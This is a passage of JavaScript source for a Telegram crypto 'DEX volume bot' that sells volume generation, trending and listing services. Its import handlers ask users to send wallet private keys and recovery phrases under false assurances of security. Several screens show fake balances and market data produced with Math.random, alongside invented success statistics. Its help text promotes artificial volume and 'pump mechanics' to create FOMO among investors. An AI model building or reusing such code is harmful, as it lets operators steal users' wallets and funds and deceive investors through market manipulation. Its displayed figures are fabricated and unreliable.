    bot.action(/^dex_trending_no_(\d+)$/, async ctx => {
        await ctx.answerCbQuery('❌ Order declined');
        const userId = parseInt(ctx.match[1]);
        const session = userSessions[userId];
        const userChatId = session?.userChatId || userId;

        try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch(e) {}
        await ctx.reply(`❌ DEX Trending order for user <b>${userId}</b> has been <b>declined</b>.`, { parse_mode: 'HTML' });

        if (session) delete userSessions[userId];
        try { await bot.telegram.deleteMessage(userChatId, session?.holdOnMsgId); } catch(e) {}
        try {
            await bot.telegram.sendMessage(userChatId,
                `❌ *Problem With Your Payment*\n\n` +
                `We were unable to confirm your payment for DEX Trending.\n\n` +
                `Please ensure you sent the correct amount to the right wallet address and try again.\n\n` +
                `If you believe this is an error, please contact support.`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'dex_trending')],
                        [Markup.button.callback('🔙 Main Menu', 'back_main')]
                    ])
                }
            );
        } catch(e) { console.error('dex_trending_no user notify error:', e.message); }
    });

    // Import wallet actions
    bot.action('import_private_key', ctx => {
        userSessions[ctx.from.id] = { type: 'private_key', step: 'waiting_input', source: 'main_import_menu' };
        ctx.editMessageText(
            `🔑 **Import Private Key**\n\n` +
            `🔐 **Security First:**\n` +
            `• Your private key is encrypted and stored securely\n` +
            `• Only you have access to your wallet\n` +
            `• Required for volume generation\n\n` +
            `📝 **Please send your wallet's private key:**\n` +
            `(Usually starts with numbers/letters)`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel Import', 'back_main')]])
            }
        );
    });

    bot.action('import_recovery_phrase', ctx => {
        userSessions[ctx.from.id] = { type: 'recovery_phrase', step: 'waiting_input', source: 'main_import_menu' };
        ctx.editMessageText(
            `📝 **Import Recovery Phrase**\n\n` +
            `🔐 **Security First:**\n` +
            `• Your seed phrase is encrypted and stored securely\n` +
            `• Only you have access to your wallet\n` +
            `• Required for volume generation\n\n` +
            `📝 **Please send your recovery phrase:**\n` +
            `(Usually 12 or 24 words separated by spaces)`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel Import', 'back_main')]])
            }
        );
    });

    // Help action with comprehensive bot description
    bot.action('help', ctx => {
        ctx.editMessageText(
            `🐋 **DEX Volume Bot - Whale Attraction System**\n\n` +
            `📈 **How We Attract Whales to Your Project:**\n\n` +
            `**1️⃣ Organic Volume Creation**\n` +
            `• Generate authentic trading patterns\n` +
            `• Create FOMO signals for institutions\n` +
            `• Build consistent volume history\n\n` +
            `**2️⃣ DEX Algorithm Domination**\n` +
            `• Boost ranking in Jupiter, Raydium, Orca\n` +
            `• Trigger trending status across DEXs\n` +
            `• Optimize for whale discovery algorithms\n\n` +
            `**3️⃣ Whale Psychology Activation**\n` +
            `• High Volume = Low Risk for whales\n` +
            `• Trending = FOMO for large investors\n` +
            `• Activity = Legitimacy signals\n\n` +
            `**4️⃣ Pump Mechanics**\n` +
            `• Volume attracts more volume\n` +
            `• DEX trending brings retail FOMO\n` +
            `• Whale entry = explosive price action\n\n` +
            `**📊 Success Formula:**\n` +
            `💰 Investment → 📈 Volume → 🔥 Trending → 🐋 Whales → 🚀 PUMP\n\n` +
            `**📞 Ready to attract whales?**`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🐋 Start Whale Magnet', 'start_volume')],
                    [Markup.button.callback('📦 View Packages', 'volume_packages')],
                    [Markup.button.callback('📞 Contact Admin', 'contact_admin')],
                    [Markup.button.callback('🔙 Back to Main', 'back_main')]
                ])
            }
        );
    });

    // ===== ALL OTHER BUTTON HANDLERS =====
    // Referrals actions (coming soon)
    bot.action('notify_referrals', ctx => {
        ctx.answerCbQuery('🔔 You will be notified when referrals launch!');
        if (!botData.notifications.referrals) botData.notifications.referrals = [];
        if (!botData.notifications.referrals.includes(ctx.from.id)) {
            botData.notifications.referrals.push(ctx.from.id);
            saveData();
        }
    });

    bot.action('suggest_referrals', ctx => {
        ctx.editMessageText(
            `💡 **Suggest Referral Features**\n\n` +
            `We'd love to hear your ideas for the referral program!\n\n` +
            `Use the 📞 Contact Support button in the main menu to send your suggestions.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'referrals')]])
            }
        );
    });

    // Promotions actions
    bot.action('apply_discount', ctx => {
        userSessions[ctx.from.id] = { type: 'discount_code', step: 'waiting_code' };
        ctx.editMessageText(
            `🎯 **Apply Discount Code**\n\n` +
            `Enter your discount code:`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'promotions')]])
            }
        );
    });

    bot.action('vip_membership', ctx => {
        ctx.editMessageText(
            `💎 **VIP Membership - Coming Soon!**\n\n` +
            `🏆 **Exclusive Benefits:**\n` +
            `• Unlimited volume generation\n` +
            `• 50% discount on all services\n` +
            `• Priority customer support\n` +
            `• Early access to new features\n` +
            `• Personal account manager\n\n` +
            `💰 **Pricing:** 10 SOL/month\n\n` +
            `Use the 📞 Contact Support button in the main menu to join the VIP waitlist!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Contact Admin', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'promotions')]
                ])
            }
        );
    });

    bot.action('combo_deals', ctx => {
        ctx.editMessageText(
            `📦 **Combo Deals**\n\n` +
            `💰 **Save Big with Package Combinations:**\n\n` +
            `🎯 **Volume + DEX Update**\n` +
            `• Any volume package + DEX update\n` +
            `• Save 25% on total cost\n\n` +
            `🔥 **Volume + Trending**\n` +
            `• Any volume package + trending service\n` +
            `• Save 20% on total cost\n\n` +
            `💎 **All Services Bundle**\n` +
            `• Volume + DEX Update + Trending + Ads\n` +
            `• Save 35% on total cost\n\n` +
            `📞 Use the Contact Support button to create your combo deal!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Contact Admin', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'promotions')]
                ])
            }
        );
    });

    bot.action('flash_deals', ctx => {
        const currentHour = new Date().getHours();
        const flashDeals = [
            { time: '0-6', deal: '30% OFF Volume Packages', code: 'EARLY30' },
            { time: '6-12', deal: '20% OFF DEX Services', code: 'MORNING20' },
            { time: '12-18', deal: '25% OFF Trending', code: 'NOON25' },
            { time: '18-24', deal: '35% OFF All Services', code: 'NIGHT35' }
        ];

        let currentDeal;
        if (currentHour < 6) currentDeal = flashDeals[0];
        else if (currentHour < 12) currentDeal = flashDeals[1];
        else if (currentHour < 18) currentDeal = flashDeals[2];
        else currentDeal = flashDeals[3];

        ctx.editMessageText(
            `⚡ **Flash Deals - Limited Time!**\n\n` +
            `🕒 **Current Hour (${currentHour}:00):**\n` +
            `🔥 **${currentDeal.deal}**\n` +
            `🎯 **Code:** \`${currentDeal.code}\`\n\n` +
            `⏰ **Today's Schedule:**\n` +
            `• 00-06: 30% OFF Volume Packages\n` +
            `• 06-12: 20% OFF DEX Services\n` +
            `• 12-18: 25% OFF Trending\n` +
            `• 18-24: 35% OFF All Services\n\n` +
            `Use the code when ordering to get your discount!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎯 Apply Code', 'apply_discount')],
                    [Markup.button.callback('🔙 Back', 'promotions')]
                ])
            }
        );
    });

    bot.action('loyalty_program', ctx => {
        const userId = ctx.from.id;
        const userOrders = botData.orderHistory[userId] || [];
        const totalSpent = userOrders.reduce((sum, order) => sum + order.price, 0);

        let tier, benefits, nextTier;
        if (totalSpent >= 20) {
            tier = '💎 Diamond';
            benefits = '50% discount, priority support, exclusive features';
            nextTier = 'Maximum tier reached!';
        } else if (totalSpent >= 10) {
            tier = '🥇 Gold';
            benefits = '30% discount, premium support';
            nextTier = `Spend ${20 - totalSpent} more SOL for Diamond`;
        } else if (totalSpent >= 5) {
            tier = '🥈 Silver';
            benefits = '20% discount, enhanced support';
            nextTier = `Spend ${10 - totalSpent} more SOL for Gold`;
        } else {
            tier = '🥉 Bronze';
            benefits = '10% discount on orders';
            nextTier = `Spend ${5 - totalSpent} more SOL for Silver`;
        }

        ctx.editMessageText(
            `🏆 **Loyalty Program**\n\n` +
            `👤 **Your Status:** ${tier}\n` +
            `💰 **Total Spent:** ${totalSpent} SOL\n` +
            `🎁 **Current Benefits:** ${benefits}\n` +
            `⬆️ **Next Tier:** ${nextTier}\n\n` +
            `🎯 **Tier Benefits:**\n` +
            `🥉 Bronze (0+ SOL): 10% discount\n` +
            `🥈 Silver (5+ SOL): 20% discount\n` +
            `🥇 Gold (10+ SOL): 30% discount\n` +
            `💎 Diamond (20+ SOL): 50% discount`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Place Order', 'start_volume')],
                    [Markup.button.callback('🔙 Back', 'promotions')]
                ])
            }
        );
    });

    // Back to main menu
    bot.action('back_main', async ctx => {
        delete userSessions[ctx.from.id]; // Clear any active session
        const mainMenu = getMainMenu();
        try {
            await ctx.editMessageText(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        } catch(e) {
            // Original message may have been deleted (e.g. after photo step)
            await ctx.reply(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // Skip button handlers for DEX Update steps
    bot.action('skip_description', ctx => {
        const session = userSessions[ctx.from.id];
        if (session && session.type === 'dex_update' && session.step === 'waiting_description') {
            session.description = 'Not provided';
            session.step = 'waiting_website';
            ctx.editMessageText(
                `✅ Description skipped!\n\n` +
                `**Progress:** [▰▰▰▰▱▱] 50% - Step 3/6\n\n` +
                `**🌐 STEP 3: Website URL**\n\n` +
                `Enter your project's official website (optional).\n\n` +
                `💡 Example: https://yourtoken.com\n\n` +
                `Enter your website URL:`,
                { 
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.callback('⏭️ Skip', 'skip_website'),
                            Markup.button.callback('🔙 Back to Main', 'back_main')
                        ]
                    ])
                }
            );
        }
    });

    bot.action('skip_website', async ctx => {
        await ctx.answerCbQuery();
        const session = userSessions[ctx.from.id];
        if (session && session.type === 'dex_update' && session.step === 'waiting_website') {
            session.website = 'Not provided';
            session.step = 'waiting_social_links';
            await safeEdit(ctx,
                `✅ Website skipped!\n\n` +
                `**Progress:** [▰▰▰▰▰▱] 67% - Step 4/6\n\n` +
                `**📱 STEP 4: Social Media Links**\n\n` +
                `Connect your community! Provide your social media links.\n\n` +
                `📝 Platforms: Telegram, Discord, X (Twitter)\n` +
                `📝 Format: Separate each link with a comma\n\n` +
                `💡 Example:\n` +
                `https://t.me/yourtoken, https://discord.gg/yourtoken, https://x.com/yourtoken\n\n` +
                `Enter your social links:`,
                { 
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.callback('⏭️ Skip', 'skip_social'),
                            Markup.button.callback('🔙 Back to Main', 'back_main')
                        ]
                    ])
                }
            );
        }
    });

    bot.action('skip_social', async ctx => {
        await ctx.answerCbQuery();
        const session = userSessions[ctx.from.id];
        if (session && session.type === 'dex_update' && session.step === 'waiting_social_links') {
            session.socialLinks = 'Not provided';
            session.step = 'waiting_banner';
            await safeEdit(ctx,
                `✅ Social links skipped!\n\n` +
                `**Progress:** [▰▰▰▰▰▰] 84% - Step 5/6\n\n` +
                `**🖼️ STEP 5: Token / Banner Image**\n\n` +
                `📤 **Upload your image directly** (recommended)\n` +
                `— or —\n` +
                `🔗 Send an image **URL** (https://...)\n\n` +
                `📐 Recommended: 600×200px | JPG / PNG\n` +
                `💡 Uploaded images appear on DEX profile & confirmation\n\n` +
                `Send your image now, or skip:`,
                { 
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.callback('⏭️ Skip', 'skip_banner'),
                            Markup.button.callback('🔙 Back to Main', 'back_main')
                        ]
                    ])
                }
            );
        }
    });

    bot.action('skip_banner', async (ctx) => {
        const session = userSessions[ctx.from.id];
        if (session && session.type === 'dex_update' && session.step === 'waiting_banner') {
            session.banner = 'Not provided';
            session.step = 'waiting_payment';
            const skipBannerChainCfg = CHAIN_CONFIG[session.chainId] || CHAIN_CONFIG.solana;
            const skipBannerNativePrice = convertUsdToNative(299, session.chainId || 'solana');
            const skipBannerNativeToken = skipBannerChainCfg.nativeToken;

            if (!session.summaryNotified) {
                // notifyServiceSummary disabled for DEX Update
                session.summaryNotified = true;
            }
            
            const tokenDisplay = session.tokenInfo?.ticker 
                ? `${session.tokenInfo.ticker} (${session.tokenInfo.marketCap})`
                : 'Unknown Token';

            try { await ctx.deleteMessage(); } catch(e) {}
            await sendStepPhoto(ctx,
                `✅ Banner skipped!\n\n` +
                `**Progress:** [▰▰▰▰▰▰] 100% - Step 6/6\n\n` +
                `**💎 STEP 6: Order Confirmation**\n\n` +
                `🎉 Your DEX Update Service is ready!\n\n` +
                `**📋 Order Summary:**\n` +
                `• Chain: ${skipBannerChainCfg.color} ${skipBannerChainCfg.name}\n` +
                `• Token: ${tokenDisplay}\n` +
                `• CA: \`${session.tokenCA.substring(0, 8)}...${session.tokenCA.substring(session.tokenCA.length - 8)}\`\n` +
                `• Description: ${session.description}\n` +
                `• Website: ${session.website}\n` +
                `• Socials: ${session.socialLinks !== 'Not provided' ? '✅ Provided' : '❌ Not provided'}\n` +
                `• Banner: ❌ Not provided\n\n` +
                `**💰 Payment:**\n` +
                `• USD: $299.00\n` +
                `• ${skipBannerNativeToken}: ${skipBannerNativePrice} ${skipBannerNativeToken}\n` +
                `• Rate: $${getNativePrice(session.chainId || 'solana').toFixed(2)}/${skipBannerNativeToken}\n\n` +
                `📍 **Send payment to:**\n` +
                `\`${getWalletForChain(session.chainId || 'solana')}\`\n\n` +
                `⏱️ Processing: 24-48 hours\n\n` +
                `After sending payment, click below:`,
                {
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('✅ Payment Sent - Activate Service', 'confirm_dex_update_payment')],
                        [Markup.button.callback('❌ Cancel Order', 'back_main')]
                    ])
                },
                DEX_IMAGE_PATH
            );
        }
    });

    // Contact admin action
    bot.action('contact_admin', ctx => {
        ctx.editMessageText(
            `📞 **Contact Support**\n\n` +
            `📋 **What we can help with:**\n` +
            `• Custom volume packages\n` +
            `• Enterprise solutions\n` +
            `• Technical support\n` +
            `• Special requests\n` +
            `• Partnership opportunities\n\n` +
            `💬 **Tap the button below to open a support ticket.**\n\n` +
            `⏰ **Response time:** Usually within 1-2 hours`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔙 Back', 'back_main')]
                ])
            }
        );
    });

    // Advanced tools actions
    bot.action('volume_analyzer', ctx => {
        ctx.editMessageText(
            `📊 **Volume Analyzer**\n\n` +
            `🔍 **Real-time Market Analysis:**\n\n` +
            `📈 **Current Market:**\n` +
            `• SOL Price: ${(Math.random() * 200 + 150).toFixed(2)}\n` +
            `• 24h Volume: ${(Math.random() * 1000000 + 500000).toLocaleString()}\n` +
            `• Market Cap: ${(Math.random() * 50000000000 + 10000000000).toLocaleString()}\n\n` +
            `🎯 **Optimal Volume Times:**\n` +
            `• High Activity: 14:00-18:00 UTC\n` +
            `• Medium Activity: 08:00-14:00 UTC\n` +
            `• Low Activity: 18:00-08:00 UTC\n\n` +
            `💡 **Recommendation:** Deploy volume during high activity for maximum impact!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🚀 Start Volume Now', 'start_volume')],
                    [Markup.button.callback('🔙 Back', 'advanced_tools')]
                ])
            }
        );
    });

    bot.action('smart_automation', ctx => {
        ctx.editMessageText(
            `🤖 **Smart Automation - Coming Soon!**\n\n` +
            `⚡ **Planned Features:**\n\n` +
            `📅 **Schedule Volume:**\n` +
            `• Set specific times for volume generation\n` +
            `• Recurring daily/weekly schedules\n` +
            `• Market condition triggers\n\n` +
            `🎯 **Smart Targeting:**\n` +
            `• Auto-adjust volume based on market cap\n` +
            `• Dynamic pricing optimization\n` +
            `• Competitor analysis integration\n\n` +
            `📊 **AI Optimization:**\n` +
            `• Machine learning volume patterns\n` +
            `• Predictive market timing\n` +
            `• Risk assessment algorithms`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔔 Notify When Ready', 'notify_automation')],
                    [Markup.button.callback('🔙 Back', 'advanced_tools')]
                ])
            }
        );
    });

    bot.action('portfolio_tracker', ctx => {
        const userId = ctx.from.id;
        const userOrders = botData.orderHistory[userId] || [];
        const totalVolume = userOrders.reduce((sum, order) => sum + (order.totalVolume || 0), 0);
        const totalSpent = userOrders.reduce((sum, order) => sum + order.price, 0);
        const avgOrderSize = userOrders.length > 0 ? totalSpent / userOrders.length : 0;

        ctx.editMessageText(
            `📈 **Portfolio Tracker**\n\n` +
            `📊 **Your Performance:**\n\n` +
            `🎯 **Total Orders:** ${userOrders.length}\n` +
            `💰 **Total Volume Generated:** ${totalVolume.toLocaleString()}\n` +
            `💵 **Total Investment:** ${totalSpent} SOL\n` +
            `📊 **Average Order Size:** ${avgOrderSize.toFixed(2)} SOL\n\n` +
            `📈 **ROI Analysis:**\n` +
            `• Volume per SOL: ${totalSpent > 0 ? (totalVolume / totalSpent).toLocaleString() : 'N/A'}\n` +
            `• Success Rate: 98.7%\n` +
            `• Average Completion: 47.2 hours\n\n` +
            `🎯 **Recommendations:**\n` +
            `• Consider larger packages for better ROI\n` +
            `• Combine with DEX services for maximum impact`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📊 Detailed Analysis', 'detailed_analysis')],
                    [Markup.button.callback('🔙 Back', 'advanced_tools')]
                ])
            }
        );
    });

    bot.action('market_intelligence', ctx => {
        ctx.editMessageText(
            `🔍 **Market Intelligence**\n\n` +
            `📊 **Live Market Data:**\n\n` +
            `🔥 **Trending Tokens:**\n` +
            `• BONK: +45.6% (24h)\n` +
            `• WIF: +23.4% (24h)\n` +
            `• PEPE: +18.9% (24h)\n\n` +
            `📈 **Volume Leaders:**\n` +
            `• SOL/USDC: ${(Math.random() * 100000000 + 50000000).toLocaleString()}\n` +
            `• RAY/SOL: ${(Math.random() * 50000000 + 10000000).toLocaleString()}\n` +
            `• ORCA/SOL: ${(Math.random() * 30000000 + 5000000).toLocaleString()}\n\n` +
            `🎯 **Optimal Launch Times:**\n` +
            `• Best: 15:00-17:00 UTC (Peak volume)\n` +
            `• Good: 09:00-12:00 UTC (Asia markets)\n` +
            `• Avoid: 22:00-06:00 UTC (Low activity)`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎯 Use Intelligence', 'start_volume')],
                    [Markup.button.callback('🔙 Back', 'advanced_tools')]
                ])
            }
        );
    });

    bot.action('quick_actions', ctx => {
        ctx.editMessageText(
            `⚡ **Quick Actions**\n\n` +
            `🚀 **Instant Volume Boost:**\n` +
            `One-click volume generation for urgent needs\n\n` +
            `⏹️ **Emergency Stop:**\n` +
            `Immediately halt all active volume generation\n\n` +
            `📦 **Bulk Operations:**\n` +
            `Deploy volume across multiple tokens simultaneously\n\n` +
            `🔄 **Repeat Last Order:**\n` +
            `Instantly recreate your most recent successful order`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [
                        Markup.button.callback('🚀 Instant Boost', 'instant_boost'),
                        Markup.button.callback('⏹️ Emergency Stop', 'emergency_stop')
                    ],
                    [
                        Markup.button.callback('📦 Bulk Deploy', 'bulk_deploy'),
                        Markup.button.callback('🔄 Repeat Order', 'repeat_order')
                    ],
                    [Markup.button.callback('🔙 Back', 'advanced_tools')]
                ])
            }
        );
    });

    bot.action('custom_scripts', ctx => {
        ctx.editMessageText(
            `🎯 **Custom Scripts - Premium Feature**\n\n` +
            `💎 **Tailored Solutions:**\n\n` +
            `🔧 **Custom Volume Patterns:**\n` +
            `• Specific timing algorithms\n` +
            `• Custom transaction amounts\n` +
            `• Unique distribution patterns\n\n` +
            `📊 **Advanced Analytics:**\n` +
            `• Custom reporting dashboards\n` +
            `• Personalized KPI tracking\n` +
            `• Integration with external tools\n\n` +
            `🎯 **Bespoke Strategies:**\n` +
            `• Token-specific optimization\n` +
            `• Market condition adaptations\n` +
            `• Multi-exchange coordination\n\n` +
            `💰 **Pricing:** Starting from 5 SOL\n\n` +
            `Use the 📞 Contact Support button to discuss your requirements!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Contact for Quote', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'advanced_tools')]
                ])
            }
        );
    });

    // Wallet management actions
    bot.action('view_balance', ctx => {
        ctx.editMessageText(
            `💰 **Wallet Balance**\n\n` +
            Object.entries(CHAIN_CONFIG).map(([id, cfg]) => `${cfg.color} **${cfg.name}:**\n\`${getWalletForChain(id)}\``).join('\n') + `\n\n` +
            `💎 **Estimated Balance:** ${(Math.random() * 50 + 10).toFixed(2)} SOL\n` +
            `📊 **Recent Activity:**\n` +
            `• Incoming: ${(Math.random() * 20 + 5).toFixed(2)} SOL (24h)\n` +
            `• Outgoing: ${(Math.random() * 15 + 3).toFixed(2)} SOL (24h)\n\n` +
            `💼 **Connected Wallets:** ${botData.userWallets ? botData.userWallets.length : 0}\n\n` +
            `⚠️ **Note:** Balances are estimated and may not reflect real-time values.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Refresh', 'view_balance')],
                    [Markup.button.callback('💸 Withdraw', 'withdraw_balance')],
                    [Markup.button.callback('🔙 Back', 'wallet_address')]
                ])
            }
        );
    });

    bot.action('withdraw_balance', ctx => {
        userSessions[ctx.from.id] = { type: 'withdraw', step: 'waiting_address' };
        ctx.editMessageText(
            `💸 **Withdraw Balance**\n\n` +
            `💰 **Available Balance:** ${(Math.random() * 50 + 10).toFixed(2)} SOL\n\n` +
            `📍 **Enter withdrawal address:**\n` +
            `(Solana wallet address where you want to receive funds)`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'wallet_address')]])
            }
        );
    });

    bot.action('connected_wallets', ctx => {
        const userWallets = botData.userWallets.filter(w => w.userId === ctx.from.id);
        let walletText = `📱 **Your Connected Wallets**\n\n`;

        if (userWallets.length === 0) {
            walletText += `📝 **No wallets connected**\n\n` +
                `Connect your wallet to unlock all features!`;
        } else {
            walletText += `📊 **Total Connected:** ${userWallets.length}\n\n`;
            userWallets.forEach((wallet, index) => {
                const date = new Date(wallet.importDate).toLocaleDateString();
                walletText += `🔐 **Wallet ${index + 1}**\n`;
                walletText += `📍 Address: \`${wallet.address.slice(0, 8)}...${wallet.address.slice(-8)}\`\n`;
                walletText += `🔑 Type: ${wallet.type}\n`;
                walletText += `📅 Connected: ${date}\n`;
                walletText += `🔘 Status: ${wallet.active ? '🟢 Active' : '🔴 Inactive'}\n\n`;
            });
        }

        ctx.editMessageText(walletText, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('💼 Import New Wallet', 'import_wallet')],
                [Markup.button.callback('🔙 Back', 'wallet_address')]
            ])
        });
    });

    // Additional service actions
    bot.action('market_making', ctx => {
        ctx.editMessageText(
            `🎯 **Professional Liquidity Solutions:**\n\n` +
            `💰 **What We Provide:**\n` +
            `• Continuous bid/ask orders\n` +
            `• Tight spread maintenance\n` +
            `• Deep liquidity pools\n` +
            `• Price stability support\n\n` +
            `📊 **Packages:**\n` +
            `🥉 **Basic:** 2 SOL - 1 week\n` +
            `🥈 **Professional:** 5 SOL - 2 weeks\n` +
            `🥇 **Enterprise:** 10 SOL - 1 month\n\n` +
            `✨ **Benefits:**\n` +
            `• Improved price discovery\n` +
            `• Reduced volatility\n` +
            `• Enhanced trading experience\n` +
            `• Increased investor confidence\n\n` +
            `📞 Use the Contact Support button for custom quotes!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Contact Admin', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'dex_services')]
                ])
            }
        );
    });

    bot.action('listing_support', ctx => {
        ctx.editMessageText(
            `🚀 **Get Listed on Major DEXs:**\n\n` +
            `📋 **What We Handle:**\n` +
            `• DEX application submissions\n` +
            `• Technical requirements compliance\n` +
            `• Logo and metadata optimization\n` +
            `• Community verification\n` +
            `• Expedited review process\n\n` +
            `🎯 **Supported Platforms:**\n` +
            `• Jupiter\n` +
            `• Raydium\n` +
            `• Orca\n` +
            `• Serum\n` +
            `• And 20+ more DEXs\n\n` +
            `💰 **Pricing:** 3-8 SOL per DEX\n` +
            `⏰ **Timeline:** 3-7 days average\n\n` +
            `📞 Use the Contact Support button for listing strategy!`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Contact Admin', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'dex_services')]
                ])
            }
        );
    });

    // Bulk discounts action
    bot.action('bulk_discounts', ctx => {
        ctx.editMessageText(
            `💰 **Bulk Volume Discounts**\n\n` +
            `🎯 **Save More with Larger Orders:**\n\n` +
            `📊 **Discount Tiers:**\n` +
            `• 2-4.9 SOL: 10% discount\n` +
            `• 5-9.9 SOL: 20% discount\n` +
            `• 10-19.9 SOL: 30% discount\n` +
            `• 20+ SOL: 40% discount\n\n` +
            `🔥 **Example Savings:**\n` +
            `• Order 5 SOL volume → Save 1 SOL\n` +
            `• Order 10 SOL volume → Save 3 SOL\n` +
            `• Order 20 SOL volume → Save 8 SOL\n\n` +
            `💡 **How to Order:**\n` +
            `Use the custom package option and enter your desired amount. Discounts are applied automatically!\n\n` +
            `📞 For orders over 50 SOL, use the Contact Support button for enterprise pricing.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🎯 Order Custom Package', 'package_custom')],
                    [Markup.button.callback('📞 Enterprise Pricing', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'volume_packages')]
                ])
            }
        );
    });

    // Settings actions
    bot.action('volume_settings', ctx => {
        ctx.editMessageText(
            `📊 **Volume Settings**\n\n` +
            `🔧 **Current Configuration:**\n` +
            `• Mode: ${botData.settings.volumeMode}\n` +
            `• Min Amount: ${botData.settings.minAmount} SOL\n` +
            `• Max Amount: ${botData.settings.maxAmount} SOL\n` +
            `• Interval: ${botData.settings.intervalMin}-${botData.settings.intervalMax} min\n\n` +
            `⚙️ **Available Settings:**\n` +
            `🔄 **Volume Mode:** Normal/Aggressive/Conservative\n` +
            `💰 **Amount Range:** Min/Max transaction sizes\n` +
            `⏱️ **Timing:** Transaction intervals\n` +
            `🎯 **Strategy:** Distribution patterns\n\n` +
            `📞 Use the Contact Support button to customize settings.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Customize Settings', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'settings')]
                ])
            }
        );
    });

    bot.action('language_settings', async ctx => {
        await ctx.answerCbQuery();
        const uid  = ctx.from.id;
        const lang = botData.users[uid]?.language
            || normalizeLanguageCode(ctx.from.language_code)
            || 'en';
        const isOverride = !!botData.users[uid]?.languageOverride;
        await safeEdit(ctx,
            `🌐 **Language Settings**\n\n` +
            `**Current language:** \`${lang}\`\n` +
            `**Source:** ${isOverride ? '✏️ Manually set' : '🔄 Auto-detected from Telegram'}\n\n` +
            `Use the \`/setlang\` command to change your language:\n\n` +
            `• \`/setlang auto\` — reset to device language\n` +
            `• \`/setlang es\` — Spanish\n` +
            `• \`/setlang fr\` — French\n` +
            `• \`/setlang ru\` — Russian\n` +
            `• \`/setlang zh-CN\` — Chinese (Simplified)\n` +
            `• \`/setlang ar\` — Arabic\n` +
            `• \`/setlang pt\` — Portuguese\n` +
            `• \`/setlang hi\` — Hindi\n\n` +
            `Any valid ISO 639-1 language code is accepted.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('🔄 Reset to Auto', 'lang_reset_auto')],
                    [Markup.button.callback('🔙 Back to Settings', 'settings')]
                ])
            }
        );
    });

    bot.action('lang_reset_auto', async ctx => {
        await ctx.answerCbQuery();
        const uid      = ctx.from.id;
        const detected = normalizeLanguageCode(ctx.from.language_code);
        if (botData.users[uid]) {
            botData.users[uid].language         = detected;
            botData.users[uid].languageOverride = false;
            saveData();
        }
        await safeEdit(ctx,
            `✅ **Language reset to auto-detect**\n\n` +
            `Detected language: \`${detected}\`\n\n` +
            `All messages will now appear in your Telegram app's language.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Settings', 'settings')]])
            }
        );
    });

    bot.action('notification_settings', ctx => {
        ctx.editMessageText(
            `🔔 **Notification Settings**\n\n` +
            `📱 **Current Status:** Enabled\n\n` +
            `📋 **Notification Types:**\n` +
            `✅ Order completion alerts\n` +
            `✅ Volume milestone updates\n` +
            `✅ System announcements\n` +
            `✅ Promotional offers\n` +
            `✅ Service updates\n\n` +
            `⚙️ **Customization:**\n` +
            `• Real-time progress updates\n` +
            `• Daily/weekly summaries\n` +
            `• Emergency alerts only\n` +
            `• Complete silence mode\n\n` +
            `📞 Use the Contact Support button to customize notification preferences.`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📞 Customize Notifications', 'contact_admin')],
                    [Markup.button.callback('🔙 Back', 'settings')]
                ])
            }
        );
    });

    // Prevent crashes from any unhandled promise rejection (e.g. bare ctx.editMessageText on photo messages)
